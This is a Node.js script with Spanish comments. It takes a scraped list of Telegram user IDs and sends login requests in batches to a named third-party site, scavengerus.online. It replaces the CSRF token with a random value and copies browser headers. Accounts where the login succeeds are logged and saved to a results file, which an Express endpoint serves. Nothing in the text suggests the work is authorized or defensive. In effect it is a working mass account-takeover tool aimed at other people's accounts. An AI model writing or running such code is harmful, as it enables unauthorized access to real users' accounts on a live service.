import fetch from "node-fetch";
//import { safeFetch } from "./modelos/fetchHandler.js";
import fs from "node:fs";
import express from "express"
const app = express();

const outFile = './theresults.json';
const jsonName = "./senders-ids-ChatKurama.json"
//import { contacts } from "./contacts-array.js"

app.get("/", (_req, res) => {
    var json = fs.readFileSync(outFile);
    res.json(JSON.parse(json));
})

app.get("/ok", (_req, res) => {
    res.send("ok");
})

app.listen(process.env.PORT || 3000, () => {
    console.log("se esta escuchando")
})

// npm i colors
import colors from "colors"
// --- safeFetch (intenta parsear JSON incluso en HTTP non-OK) ---
async function safeFetch(url, options = {}) {
    try {
        const res = await fetch(url, options);

        let parsed = null;
        try {
            parsed = await res.json();
        } catch {
            try {
                parsed = await res.text();
            } catch {
                parsed = null;
            }
        }

        const value = {
            data: parsed,
            status: res.status,
            ok: res.ok,
            statusText: res.statusText,
            url,
        };

        if (!res.ok) {
            return [value, new Error(`HTTP ${res.status}: ${res.statusText}`)];
        }
        return [value, null];
    } catch (err) {
        return [null, err];
    }
}

// --- tryLogin (usa safeFetch, hace logs y devuelve objeto uniforme) ---
// Asegúrate de tener tokenOptions y loginOptions definidos en tu scope.
// Ejemplo mínimo:
// const tokenOptions = { method: 'GET', headers: { 'Accept': 'application/json' } };
// function loginOptions({ csrfToken, telegramId }) {
//   return {
//     method: 'POST',
//     headers: {
//       'Content-Type': 'application/json',
//       'Accept': 'application/json',
//       // 'X-CSRF-Token': csrfToken, // según API
//     },
//     body: JSON.stringify({ telegramId, /* ... */ }),
//   };
// }

async function tryLogin({ telegramId, tokenOptions, loginOptions }) {
    // 1) pedir csrf token
    /*  const [tokenValue, tokenError] = await safeFetch(
         "https://scavengerus.online/api/csrf-token",
         tokenOptions
     );
 
     if (tokenError && !tokenValue) {
         // error de red (sin body)
         console.error(("Error token (network): " + tokenError.message).red);
         return {
             telegramId,
             loginValue: null,
             error: tokenError.message,
             note: 'token-network-error',
             tokenResponse: null,
         };
     }
 
     // tokenValue existe (puede ser ok o no-ok)
     const tokenBody = tokenValue ? tokenValue.data : null;
     var csrfToken = tokenBody && (tokenBody.csrfToken ?? tokenBody.csrf_token ?? null); */
    var csrfToken = "" + Math.random();
    if (!csrfToken) {
        // No encontramos token, pero aún así intentamos login (si quieres)
        console.warn((`Aviso: no se encontró csrfToken para ${telegramId}. tokenBody: ${JSON.stringify(tokenBody)}`).yellow);
    }

    // 2) login
    const [loginValue, loginError] = await safeFetch(
        "https://scavengerus.online/api/login",
        loginOptions({ csrfToken, telegramId })
    );

    // Logging según caso
    if (!loginValue) {
        // network error en login
        //console.error((`Error login (network) ${telegramId}: ${loginError?.message ?? 'unknown'}`).red);
        return {
            telegramId,
            loginValue: null,
            error: loginError?.message ?? 'network',
            note: 'login-network-error',
            tokenResponse: csrfToken,
        };
    }

    // Si recibimos loginValue (HTTP ok o no-ok)
    // console.log(csrfToken)
    if (loginValue.ok) {
        console.log((telegramId + " | " + JSON.stringify(loginValue.data)).green);
        console.log("PERRO")

    } /* else {
        // HTTP no-ok
        console.warn((`Login HTTP ${loginValue.status} ${loginValue.statusText} | ${telegramId} | body: ${JSON.stringify(loginValue.data)}`).yellow);
        if (loginError) {
            console.error(("Error login (http error): " + loginError.message).red);
        }
    } */

    // Devuelve un objeto que se puede serializar directamente
    return {
        telegramId,
        loginValue,      // { data, status, ok, statusText, url }
        error: loginError ? loginError.message : null,
        tokenResponse: csrfToken,
    };
}





async function processAll(startIndex = 0) {
    const tokenOptions = { method: 'GET', headers: { 'Accept': 'application/json' } };
    function loginOptions({ csrfToken, telegramId }) {
        return {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'x-csrf-token': csrfToken,
            },
            body: JSON.stringify({ telegramId, csrfToken }),
        };
    }

    const raw = fs.readFileSync(jsonName, 'utf8');
    var miembros = JSON.parse(raw);
    if (!Array.isArray(miembros)) throw new Error('miembros.json no contiene un array');


    /* JEJEJEJEEJ */

    /*  console.log(contacts)
     miembros = contacts.map(e=>{return {id:e.split(" ").slice(1).join("").replace(/[^\d]/g, "")}});
     console.log(miembros) */


    const batchSize = 10;

    // ---- Sobrescribir el archivo de resultados al iniciar ----
    // Esto garantiza que en cada ejecución el fichero se reemplace (se inicia vacío)
    const resultados = [];
    fs.writeFileSync(outFile, JSON.stringify(resultados, null, 2), 'utf8');

    console.log(`🔄 Iniciando desde índice ${startIndex}, batch ${Math.floor(startIndex / batchSize) + 1}`);

    for (let i = startIndex; i < miembros.length; i += batchSize) {
        const batch = miembros.slice(i, i + batchSize);

        const promises = batch.map(miembro => {
            const telegramId = miembro.id ? String(miembro.id) : miembro.username;
            if (!telegramId) {
                console.warn(("Miembro sin id/username, se salta: " + JSON.stringify(miembro)).yellow);
                return Promise.resolve({
                    telegramId: null,
                    loginValue: null,
                    error: "sin id o username"
                });
            }
            return tryLogin({ telegramId, tokenOptions, loginOptions })
                .catch(err => ({
                    telegramId,
                    loginValue: null,
                    error: `unexpected: ${err.message}`
                }));
        });

        const settled = await Promise.allSettled(promises);

        for (const r of settled) {
            if (r.status === 'fulfilled') resultados.push(r.value);
            else resultados.push({ error: r.reason?.message || 'error desconocido' });
        }

        // Guardar progresivamente (sobrescribe cada vez, pero como usamos 'resultados' reescribe con el array actualizado)
        fs.writeFileSync(outFile, JSON.stringify(resultados, null, 2), 'utf8');

        console.log(`✅ Batch ${Math.floor(i / batchSize) + 1} completado (${resultados.length}/${miembros.length})`);
        await new Promise(r => setTimeout(r, 500));
    }

    console.log(("Proceso finalizado. Resultados guardados en " + outFile).green);
    //process.exit()
}



// Ejecutar
processAll(0).catch((e) => {
    console.error(("Fatal: " + e.message).red);
    process.exit(1);
});


const tokenOptions = {
    "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,es-CO;q=0.8,es-ES;q=0.7,es;q=0.6",
        "sec-ch-ua": "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "Referer": "https://scavengerus.online/login"
    },
    "body": null,
    "method": "GET"
}

function loginOptions({ csrfToken, telegramId }) {
    return ({
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9,es-US;q=0.8,es;q=0.7",
            "content-type": "application/json",
            "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-csrf-token": csrfToken,
            "Referer": "https://scavengerus.online/login"
        },
        "body": "{\"telegramId\":\"" + telegramId + "\",\"csrfToken\":\"" + csrfToken + "\"}",
        "method": "POST"
    })
}


